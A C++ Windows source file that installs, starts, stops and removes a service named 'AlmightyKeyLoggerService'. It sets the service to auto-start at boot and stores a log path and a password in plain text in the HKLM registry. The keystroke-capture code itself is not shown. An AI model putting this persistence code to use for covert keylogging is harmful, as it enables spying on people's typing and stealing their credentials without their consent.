#include <windows.h>
#include <iostream>
#include <string>
#include <tchar.h>

// Define constants for easier modification
const wchar_t* SERVICE_NAME = L"AlmightyKeyLoggerService";
const wchar_t* SERVICE_DISPLAY_NAME = L"AlmightyKeyLoggerService";
const wchar_t* SERVICE_EXECUTABLE_PATH = L"C:\\Users\\user\\source\\repos\\AlmightyKeyLogger\\x64\\Debug\\AlmightyKeyLoggerService.exe";
const wchar_t* REGISTRY_KEY_PATH = L"SOFTWARE\\AlmightyKeyLogger";

void InstallService(const std::wstring& logFilePath, const std::wstring& password);
void UninstallService();
void WriteArgumentsToRegistry(const std::wstring& logFilePath, const std::wstring& password);
void CleanupRegistry();
bool StartServiceByName(const wchar_t* serviceName);
bool StopServiceByName(const wchar_t* serviceName);

int wmain(int argc, wchar_t* argv[])
{
    if (argc < 2)
    {
        std::wcerr << L"Usage: Sugiot.exe --install --f <log_file_full_path> --p <password> or Sugiot.exe --uninstall or Sugiot.exe --start or Sugiot.exe --stop" << std::endl;
        return 1;
    }

    std::wstring action = argv[1];
    if (action == L"--install")
    {
        std::wstring logFilePath;
        std::wstring password;

        for (int i = 2; i < argc; i++)
        {
            if (std::wstring(argv[i]) == L"--f" && i + 1 < argc)
            {
                logFilePath = argv[++i];
            }
            else if (std::wstring(argv[i]) == L"--p" && i + 1 < argc)
            {
                password = argv[++i];
            }
        }

        if (!logFilePath.empty() && !password.empty())
        {
            WriteArgumentsToRegistry(logFilePath, password);
            InstallService(logFilePath, password);
            StartServiceByName(SERVICE_NAME);
        }
        else
        {
            std::wcerr << L"Missing log file path or password" << std::endl;
            return 1;
        }
    }
    else if (action == L"--uninstall")
    {

        UninstallService();
    }
    else if (action == L"--start")
    {
        if (!StartServiceByName(SERVICE_NAME))
        {
            return 1;
        }
    }
    else if (action == L"--stop")
    {
        if (!StopServiceByName(SERVICE_NAME))
        {
            return 1;
        }
    }
    else
    {
        std::wcerr << L"Unknown command" << std::endl;
        return 1;
    }

    return 0;
}

void WriteArgumentsToRegistry(const std::wstring& logFilePath, const std::wstring& password)
{
    HKEY hKey;
    LONG result = RegCreateKeyEx(HKEY_LOCAL_MACHINE, REGISTRY_KEY_PATH, 0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL);
    if (result == ERROR_SUCCESS)
    {
        RegSetValueEx(hKey, L"LogFilePath", 0, REG_SZ, (const BYTE*)logFilePath.c_str(), (logFilePath.size() + 1) * sizeof(wchar_t));
        RegSetValueEx(hKey, L"Password", 0, REG_SZ, (const BYTE*)password.c_str(), (password.size() + 1) * sizeof(wchar_t));
        RegCloseKey(hKey);
    }
    else
    {
        std::wcerr << L"Failed to write to registry" << std::endl;
    }
}

void CleanupRegistry()
{
    LONG result = RegDeleteKey(HKEY_LOCAL_MACHINE, REGISTRY_KEY_PATH);
    if (result == ERROR_SUCCESS)
    {
        std::wcout << L"Registry entries cleaned up successfully" << std::endl;
    }
    else
    {
        std::wcerr << L"Failed to clean up registry entries: " << result << std::endl;
    }
}

void InstallService(const std::wstring& logFilePath, const std::wstring& password)
{
    SC_HANDLE hSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
    if (hSCManager)
    {
        SC_HANDLE hService = CreateService(
            hSCManager,
            SERVICE_NAME,
            SERVICE_DISPLAY_NAME,
            SERVICE_ALL_ACCESS,
            SERVICE_WIN32_OWN_PROCESS,
            SERVICE_AUTO_START,
            SERVICE_ERROR_NORMAL,
            SERVICE_EXECUTABLE_PATH,
            NULL, NULL, NULL, NULL, NULL);

        if (hService)
        {
            std::wcout << L"Service installed successfully" << std::endl;
            CloseServiceHandle(hService);
        }
        else
        {
            std::wcerr << L"Failed to install service: " << GetLastError() << std::endl;
        }

        CloseServiceHandle(hSCManager);
    }
    else
    {
        std::wcerr << L"Failed to open service manager: " << GetLastError() << std::endl;
    }
}

void UninstallService()
{
    SC_HANDLE hSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_CONNECT);
    if (hSCManager)
    {
        SC_HANDLE hService = OpenService(hSCManager, SERVICE_NAME, SERVICE_STOP | DELETE);
        if (hService)
        {
            std::wcout << L"Will terminate in 11 seconds. Waiting for the daemons to save information..." << std::endl;
            // Stop the service
            SERVICE_STATUS_PROCESS ssp;
            DWORD bytesNeeded;
            if (ControlService(hService, SERVICE_CONTROL_STOP, (LPSERVICE_STATUS)&ssp))
            {
                std::wcout << L"Stopping service..." << std::endl;
                Sleep(1000);

                while (QueryServiceStatusEx(hService, SC_STATUS_PROCESS_INFO, (LPBYTE)&ssp, sizeof(SERVICE_STATUS_PROCESS), &bytesNeeded))
                {
                    if (ssp.dwCurrentState == SERVICE_STOPPED)
                        break;

                    if (ssp.dwCurrentState == SERVICE_STOP_PENDING)
                    {
                        std::wcout << L"Service stop pending..." << std::endl;
                        Sleep(1000);
                    }
                    else
                    {
                        std::wcerr << L"Failed to stop service." << std::endl;
                        break;
                    }
                }

                if (ssp.dwCurrentState == SERVICE_STOPPED)
                {
                    std::wcout << L"Service stopped successfully." << std::endl;
                }
            }
            else
            {
                DWORD err = GetLastError();
                if (err == ERROR_SERVICE_NOT_ACTIVE)
                {
                    std::wcout << L"Service is not running." << std::endl;
                }
                else
                {
                    std::wcerr << L"ControlService failed: " << err << std::endl;
                }
            }

            // Delete the service
            if (DeleteService(hService))
            {
                std::wcout << L"Service uninstalled successfully" << std::endl;
            }
            else
            {
                std::wcerr << L"Failed to uninstall service: " << GetLastError() << std::endl;
            }

            CloseServiceHandle(hService);
        }
        else
        {
            std::wcerr << L"Failed to open service: " << GetLastError() << std::endl;
        }

        CloseServiceHandle(hSCManager);

        // Clean up registry entries
        CleanupRegistry();
    }
    else
    {
        std::wcerr << L"Failed to open service manager: " << GetLastError() << std::endl;
    }
}

bool StartServiceByName(const wchar_t* serviceName)
{
    SC_HANDLE hSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_CONNECT);
    if (!hSCManager)
    {
        std::wcerr << L"OpenSCManager failed: " << GetLastError() << std::endl;
        return false;
    }

    SC_HANDLE hService = OpenService(hSCManager, serviceName, SERVICE_START);
    if (!hService)
    {
        std::wcerr << L"OpenService failed: " << GetLastError() << std::endl;
        CloseServiceHandle(hSCManager);
        return false;
    }

    if (!StartService(hService, 0, NULL))
    {
        std::wcerr << L"StartService failed: " << GetLastError() << std::endl;
        CloseServiceHandle(hService);
        CloseServiceHandle(hSCManager);
        return false;
    }

    CloseServiceHandle(hService);
    CloseServiceHandle(hSCManager);
    return true;
}

bool StopServiceByName(const wchar_t* serviceName)
{
    SC_HANDLE hSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_CONNECT);
    if (!hSCManager)
    {
        std::wcerr << L"OpenSCManager failed: " << GetLastError() << std::endl;
        return false;
    }

    SC_HANDLE hService = OpenService(hSCManager, serviceName, SERVICE_STOP);
    if (!hService)
    {
        std::wcerr << L"OpenService failed: " << GetLastError() << std::endl;
        CloseServiceHandle(hSCManager);
        return false;
    }

    SERVICE_STATUS_PROCESS ssp;
    DWORD bytesNeeded;
    if (ControlService(hService, SERVICE_CONTROL_STOP, (LPSERVICE_STATUS)&ssp))
    {
        std::wcout << L"Stopping service..." << std::endl;
        Sleep(1000);

        while (QueryServiceStatusEx(hService, SC_STATUS_PROCESS_INFO, (LPBYTE)&ssp, sizeof(SERVICE_STATUS_PROCESS), &bytesNeeded))
        {
            if (ssp.dwCurrentState == SERVICE_STOPPED)
                break;

            if (ssp.dwCurrentState == SERVICE_STOP_PENDING)
            {
                std::wcout << L"Service stop pending..." << std::endl;
                Sleep(1000);
            }
            else
            {
                std::wcerr << L"Failed to stop service." << std::endl;
                break;
            }
        }

        if (ssp.dwCurrentState == SERVICE_STOPPED)
        {
            std::wcout << L"Service stopped successfully." << std::endl;
        }
    }
    else
    {
        DWORD err = GetLastError();
        if (err == ERROR_SERVICE_NOT_ACTIVE)
        {
            std::wcout << L"Service is not running." << std::endl;
        }
        else
        {
            std::wcerr << L"ControlService failed: " << err << std::endl;
        }
    }

    CloseServiceHandle(hService);
    CloseServiceHandle(hSCManager);
    return true;
}
